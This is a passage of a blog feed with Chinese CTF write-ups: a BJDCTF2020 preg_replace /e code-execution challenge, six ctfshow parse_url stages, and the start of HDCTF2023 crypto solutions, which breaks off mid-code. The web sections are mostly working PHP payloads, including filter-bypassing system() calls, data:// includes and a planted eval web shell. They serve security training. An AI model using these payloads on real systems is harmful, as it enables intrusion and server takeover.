      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>${}与preg_replace_e模式命令执行--[BJDCTF2020]ZJCTF</title>
    <link href="/2023/09/19/$%7B%7D%E4%B8%8Epreg_replace_e%E6%A8%A1%E5%BC%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--%5BBJDCTF2020%5DZJCTF/"/>
    <url>/2023/09/19/$%7B%7D%E4%B8%8Epreg_replace_e%E6%A8%A1%E5%BC%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--%5BBJDCTF2020%5DZJCTF/</url>
    
    <content type="html"><![CDATA[<p><strong>总结：</strong><code>**$&#123;&#125;**</code><strong>可以命令执行，5.6.x 版本php</strong><code>**preg_replace**``**/e**</code><strong>模式存在命令执行，对一个正则表达式模式或部分模式 两边添加圆括号 将导致反向引用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br><br>error_reporting(<span class="hljs-number">0</span>);<br>$text = $_GET[<span class="hljs-string">&quot;text&quot;</span>];<br>$file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(isset($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    echo <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$file))&#123;<br>        die(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    include($file);  //<span class="hljs-built_in">next</span>.php<br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p><code>/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code><br />post <code>I have a dream</code>拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>    <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>    <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>    <span class="hljs-variable">$str</span><br>  );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>  @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>分析一下代码：<br />显眼的定义了<code>getFlag()</code>方法可以命令执行<br />唯一输入点<code>$id = $_GET[&#39;id&#39;]</code><br />重点在<code>complex</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>    <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>    <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>    <span class="hljs-variable">$str</span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><code>complex</code>接受两个参数并返回一个正则匹配的结果<br />来看看这个正则<br /><code>preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, $str);</code><br />把<code>$str</code>中匹配到的<code>$re</code>全替换为<code>strtolower(&quot;\\1&quot;)</code><br />然后<br /><code>foreach($_GET as $re =&gt; $str) &#123;echo complex($re, $str). &quot;\n&quot;;&#125;</code><br />调用了<code>complex</code>方法，并且因为<code>foreach($_GET as $re =&gt; $str)</code>导致<br /><code>$re $str</code> 两个变量都可控<br /><code>$re</code> 为get传入的参数名，<code>$str</code>为传入参数的值<br />这里面 <code>preg_replace</code> 使用了 <code>/e </code>模式，导致代码执行，函数的第二个参数可以被执行</p><blockquote><p><strong>反向引用</strong><br>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><p><strong>这里的</strong><code>**strtolower(&quot;\\1&quot;)**</code><strong>相当于 \1，也就是匹配到的第一个字符串，这样就可以通过两个可控变量</strong><code>**$re $str**</code><strong>来构造命令执行</strong><br />在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。<br /><img src="https://c.img.dasctf.com/images/2023919/1695135701111-9a6f74d3-ed3c-497f-8692-c1c107c66ce4.png"><br />php声明变量有几种方式  <code>$&#123;a&#125;==$a==&#123;$&#123;a&#125;&#125;</code><br /><img src="https://c.img.dasctf.com/images/2023919/1695135731758-8c450d0d-d953-440e-a8ec-0a49a747245b.png"><br /><strong>如果${}里面是一个方法会发生什么</strong><br /><img src="https://c.img.dasctf.com/images/2023919/1695135741307-1f4147ae-bbcf-400b-88de-d5fe732c2eb7.png"><br />可以看到执行了phpinfo()<br />回到题目<br />传入<code>?\S*=$&#123;phpinfo()&#125;</code><br />由于<code>foreach($_GET as $re =&gt; $str) &#123;echo complex($re, $str). &quot;\n&quot;;&#125;</code><br />得到<code>$re=\S*</code> <code> $str=$&#123;phpinfo()&#125;</code>     ///<code> \S*</code>匹配一个任意非空白字符  <br />则<code>preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, $str);</code><br />变成<code>preg_replace(&#39;/(\S*)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, $&#123;phpinfo()&#125;);</code><br />该正则会执行<code>strtolower(&quot;\\1&quot;)</code>匹配之后就相当于执行<code>strtolower(&quot;$&#123;phpinfo()&#125;&quot;)</code>  //strtolower把所有字符转换为小写<br />此时phpinfo()会被执行<br /><img src="https://c.img.dasctf.com/images/2023919/1695135749130-d1553763-9b92-401e-975d-f2ca79bbbded.png"><br />成功执行phpinfo()<br />同样可以执行题目给的<code>getFlag()</code>方法<br /><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;whoami&#39;);</code>==<code>?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=system(&#39;whoami&#39;);</code><br /><img src="https://c.img.dasctf.com/images/2023919/1695136834207-43312e2c-ec7c-46e9-965c-dc1c0f3b09a7.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-周末大挑战2023.5.12-PARSE_URL</title>
    <link href="/2023/05/15/ctfshow-%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%982023.5.12-PARSE_URL/"/>
    <url>/2023/05/15/ctfshow-%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%982023.5.12-PARSE_URL/</url>
    
    <content type="html"><![CDATA[<h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$data = parse_url($_GET[<span class="hljs-string">&#x27;u&#x27;</span>])<span class="hljs-comment">;</span><br><br><span class="hljs-built_in">eval</span>($data[<span class="hljs-string">&#x27;host&#x27;</span>])<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="https://c.img.dasctf.com/images/2023516/1684222941259-85d9a70b-8d78-4329-8dd6-1ff4eb990e0b.png"><br>通过<code>parse_url</code>数组获取的 get的u的值来命令执行<br>payload<code>?u=[http://system(&#39;cd](http://system(&#39;cd) ..;cd ..;cd ..;tac f*&#39;);</code><br><code>?u=http://system(&#39;ls&#39;);</code>得到<code>index.php init.php </code><br><code>?u=[http://system(&#39;ls](http://system(&#39;ls) /&#39;);</code>无回显<br>尝试<code>?u=[http://system(&#39;cat](http://system(&#39;cat) index.php&#39;);</code>无回显，推断过滤了/和cat<br>通过命令拼接回到根目录<code>?u=[http://system(&#39;cd](http://system(&#39;cd) ..;cd ..;cd ..;ls&#39;);</code>-&gt;<code>bin dev etc flag_is_here.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </code><br>也可以通过编码绕过，反引号执行<br><img src="https://c.img.dasctf.com/images/2023516/1684222972272-82e9bcd6-6cdb-4bdd-bbd5-a6177243da5a.png"><br>eval<code>system(&#39;echo bHMgLw==|base64 -d&#39;);</code>得到 <code>ls /</code>就获取了命令的字符串，然后通过反引号执行<br><code>?u=[http://system(&quot;</code>echo](<a href="http://system(&quot;`echo)/">http://system(&quot;`echo)</a> bHMgLw==|base64 -d<code>&quot;);</code> == ls/<br><code>?u=[http://system(&quot;</code>echo](<a href="http://system(&quot;`echo)/">http://system(&quot;`echo)</a> dGFjIC9mKg==|base64 -d<code>&quot;);</code> ==tac /f*</p><h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-variable">$data</span> = parse_url(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;host&#x27;</span>].<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_SCHEME));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_USER));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PASS));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_HOST));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PORT));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PATH));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_QUERY));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_FRAGMENT));<br><span class="hljs-meta">?&gt;</span><br>输出：<br><span class="hljs-keyword">array</span>(<span class="hljs-number">8</span>) &#123;<br>  [<span class="hljs-string">&quot;scheme&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br>  [<span class="hljs-string">&quot;host&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;hostname&quot;</span><br>  [<span class="hljs-string">&quot;port&quot;</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">9090</span>)<br>  [<span class="hljs-string">&quot;user&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;username&quot;</span><br>  [<span class="hljs-string">&quot;pass&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;password&quot;</span><br>  [<span class="hljs-string">&quot;path&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;/path&quot;</span><br>  [<span class="hljs-string">&quot;query&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;arg=value&quot;</span><br>  [<span class="hljs-string">&quot;fragment&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;anchor&quot;</span><br>&#125;<br><span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;hostname&quot;</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">9090</span>)<br><span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;/path&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;arg=value&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;anchor&quot;</span><br></code></pre></td></tr></table></figure><p><code>include</code>用伪协议<br><code>$data[&#39;host&#39;].$data[&#39;path&#39;];</code>对host和path的值拼接<br>应该是倒着来读取的，data后面要加两个冒号<br>这样host==<code>data:</code>path==<code>//text/plain;base64,PD9waHAgZXZhbChzeXN0ZW0oJ2xzIC8nKSk7Pz4=</code>有一个冒号被当作port，不会被读取<br><code>?u=//data:://text/plain;base64,PD9waHAgZXZhbChzeXN0ZW0oJ2xzIC8nKSk7Pz4=</code> ls /<br>得到：<br><code>_f1ag_1s_h3re.txt bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var  </code><br><code>?u=//data:://text/plain;base64,PD9waHAgZXZhbChzeXN0ZW0oJ3RhYyAvX2YxYWdfMXNfaDNyZS50eHQnKSk7Pz4=</code>  <?php eval(system('tac /_f1ag_1s_h3re.txt'));?></p><h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$data</span> = parse_url(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>].<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br></code></pre></td></tr></table></figure><p>payload:<br><code>?u=data:://username:password@hostname:9090//text/plain;base64,PD9waHAgZXZhbChzeXN0ZW0oJ3RhYyAvX2YxYV9nXzFzX2gzcmUnKSk7Pz4=</code><br>同样data协议，data加一个冒号</p><h1 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h1><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">$data = parse_url($_GET[<span class="hljs-string">&#x27;u&#x27;</span>]);<br><br><span class="hljs-keyword">system</span>($data[<span class="hljs-string">&#x27;host&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>ls /的根目录会被当作path<br>和第一题一样cd回去根目录<br><code>?u=[http://username:password@cd](http://username:password@cd) ..;cd ..;cd ..;cat 1_f1ag_1s_h3re</code></p><h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">extract(parse_url(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;u&#x27;</span>]));<br>include <span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>host;<br></code></pre></td></tr></table></figure><p><img src="https://c.img.dasctf.com/images/2023516/1684222994643-3080ee98-639c-46d0-a21e-38f0f78b7190.png"><br>把数组的键值赋值给键名做变量<br>$$$$$$host就是套了几层变量<br>通过相互赋值变量名就可以<br>get：<code>?u=user://pass:fragment@scheme/?php://input%23query</code><br>通过包含php文件，input输入流传入就行<br>post：<code>&lt;?php system(&#39;cat /_f1ag_1s_h3ree&#39;);?&gt;</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$host</span>=scheme</span><br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>host=<span class="hljs-symbol">$</span>scheme=user<br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>host=<span class="hljs-symbol">$</span>user=pass<br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>host=<span class="hljs-symbol">$</span>pass=fragment<br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>host=<span class="hljs-symbol">$</span>fragment=query<br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>host=<span class="hljs-symbol">$</span>query=php:<span class="hljs-comment">//input</span><br></code></pre></td></tr></table></figure><p><img src="https://c.img.dasctf.com/images/2023516/1684223020684-cf855156-45fa-4d2c-a23b-55fd029fbecc.png"></p><h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">$data = parse<span class="hljs-constructor">_url($<span class="hljs-params">_GET</span>[&#x27;<span class="hljs-params">u</span>&#x27;])</span>;<br><br>file<span class="hljs-constructor">_put_contents($<span class="hljs-params">data</span>[&#x27;<span class="hljs-params">path</span>&#x27;], $<span class="hljs-params">data</span>[&#x27;<span class="hljs-params">host</span>&#x27;])</span>;<br></code></pre></td></tr></table></figure><p><img src="https://c.img.dasctf.com/images/2023516/1684223038960-a70c7faa-5815-46d7-93e5-8f1ff6b4db4f.png"><br>path字段传php文件名，host字段传php代码，访问文件实现rce<br>host字段不支持&lt;?php&gt;标签<br>用&lt;script标签代替<br><code>?u=http://&lt;script language=&#39;php&#39;&gt;eval($_GET[1]);/var/www/html/a.php</code><br><img src="https://c.img.dasctf.com/images/2023516/1684223062950-869a8c35-d880-466e-b3ac-fbd4eca07e97.png"><br><code>a.php?1=system(&#39;cat /_f1a_g_1s_h3re&#39;);</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HDCTF2023-wp</title>
    <link href="/2023/04/23/HDCTF/"/>
    <url>/2023/04/23/HDCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="爬过小山去看云"><a href="#爬过小山去看云" class="headerlink" title="爬过小山去看云"></a>爬过小山去看云</h3><p>由题目名字知道是hill+云影<br><img src="/mdimg/HDCTF2023/1.png"><br>得到密钥矩阵 3 4 19 11<br><img src="/mdimg/HDCTF2023/2.png"><br><img src="/mdimg/HDCTF2023/3.png"><br>随波逐流<br><img src="/mdimg/HDCTF2023/4.png"><br><code>NSSCTF&#123;NOTFLAG&#125;</code></p><h3 id="Normal-Rsa"><a href="#Normal-Rsa" class="headerlink" title="Normal_Rsa"></a>Normal_Rsa</h3><p>打开就有flag</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs 1c">from Crypto.Util.number import *<br><span class="hljs-meta">#from shin import flag</span><br><br><br>m=bytes_to_long(b&#x27;HDCTF&#123;0b<span class="hljs-number">3663</span>ed-67e4-44e2-aee7-7c2d<span class="hljs-number">8665</span>b63c&#125;&#x27;)<br>e=<span class="hljs-number">65537</span><br>p=getPrime(<span class="hljs-number">256</span>)<br><span class="hljs-meta">#q=getPrime(512)</span><br>q=<span class="hljs-number">6704006258427795304220450411280948926213189680360135534636452074716135019217911134480777251273836898349926894302122011679095979445240343891749741039976761</span><br>r=getPrime(<span class="hljs-number">512</span>)<br>n=p*q*r<br>P=<span class="hljs-built_in">pow</span>(p,<span class="hljs-number">2</span>,n)<br>Q=<span class="hljs-built_in">pow</span>(q,<span class="hljs-number">2</span>,n)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>print(f<span class="hljs-string">&quot;P = &#123;P&#125;&quot;</span>)<br>print(f<span class="hljs-string">&quot;Q = &#123;Q&#125;&quot;</span>)<br>print(f<span class="hljs-string">&quot;n = &#123;n&#125;&quot;</span>)<br>print(f<span class="hljs-string">&quot;c = &#123;c&#125;&quot;</span>)<br>&#x27;&#x27;&#x27;<br>P = <span class="hljs-number">67732476934455</span><span class="hljs-number">39441213578786</span><span class="hljs-number">58164413604303</span><span class="hljs-number">52426202652517</span><span class="hljs-number">25630106817272</span><span class="hljs-number">21242832528326</span><span class="hljs-number">24173647864512</span><span class="hljs-number">80269516220237</span><span class="hljs-number">28956790405537</span><span class="hljs-number">19625647108885</span><span class="hljs-number">10272312707201</span><br>Q = <span class="hljs-number">44943699913039</span><span class="hljs-number">04735745683555</span><span class="hljs-number">99253785124935</span><span class="hljs-number">23252980366265</span><span class="hljs-number">68689992512315</span><span class="hljs-number">78871498901850</span><span class="hljs-number">55864945749408</span><span class="hljs-number">51410046165567</span><span class="hljs-number">64745351531136</span><span class="hljs-number">31214288057465</span><span class="hljs-number">77666829197522</span><span class="hljs-number">08487764014055</span><span class="hljs-number">31599573114898</span><span class="hljs-number">49245299084777</span><span class="hljs-number">46280355525815</span><span class="hljs-number">39370236080368</span><span class="hljs-number">45764352315892</span><span class="hljs-number">05655041120058</span><span class="hljs-number">43410442573511</span><span class="hljs-number">09530623390649</span><span class="hljs-number">82042036595371</span><span class="hljs-number">35943420051121</span><br>n = <span class="hljs-number">47856138884659</span><span class="hljs-number">91171479248142</span><span class="hljs-number">01545330914954</span><span class="hljs-number">88887554533679</span><span class="hljs-number">91501772592797</span><span class="hljs-number">68607546542681</span><span class="hljs-number">55915287731234</span><span class="hljs-number">74962122102667</span><span class="hljs-number">47589353208734</span><span class="hljs-number">39009047998314</span><span class="hljs-number">74817826058951</span><span class="hljs-number">26560707889348</span><span class="hljs-number">73578785012807</span><span class="hljs-number">82935653048309</span><span class="hljs-number">49943017021401</span><span class="hljs-number">54224929273239</span><span class="hljs-number">61394806106719</span><span class="hljs-number">56916845789004</span><span class="hljs-number">02230271191153</span><span class="hljs-number">92961801582406</span><span class="hljs-number">28716764426631</span><span class="hljs-number">98982767857877</span><span class="hljs-number">30947633037300</span><span class="hljs-number">31709845340985</span><span class="hljs-number">14109361404881</span><span class="hljs-number">50390919951503</span><span class="hljs-number">76752251780903</span><span class="hljs-number">547456</span>7<br>c = <span class="hljs-number">22470275616367</span><span class="hljs-number">91381460194811</span><span class="hljs-number">20552008515085</span><span class="hljs-number">12117959567509</span><span class="hljs-number">55965051548230</span><span class="hljs-number">84423321246252</span><span class="hljs-number">51631079170677</span><span class="hljs-number">68507367576366</span><span class="hljs-number">32703584608953</span><span class="hljs-number">49160905213572</span><span class="hljs-number">12722275045521</span><span class="hljs-number">11107710669572</span><span class="hljs-number">17809438572315</span><span class="hljs-number">70836500588468</span><span class="hljs-number">48762081989368</span><span class="hljs-number">88305708421767</span><span class="hljs-number">95906808347617</span><span class="hljs-number">42135398309463</span><span class="hljs-number">92909791584139</span><span class="hljs-number">35035603633331</span><span class="hljs-number">78697822743915</span><span class="hljs-number">50423651307996</span><span class="hljs-number">47385116773171</span><span class="hljs-number">90667040953515</span><span class="hljs-number">71843913528888</span><span class="hljs-number">75130028955334</span><span class="hljs-number">87472720629214</span><span class="hljs-number">695054</span>4<br>&#x27;&#x27;&#x27;<br><br></code></pre></td></tr></table></figure><h3 id="Normal-Rsa-revenge"><a href="#Normal-Rsa-revenge" class="headerlink" title="Normal_Rsa(revenge)"></a>Normal_Rsa(revenge)</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 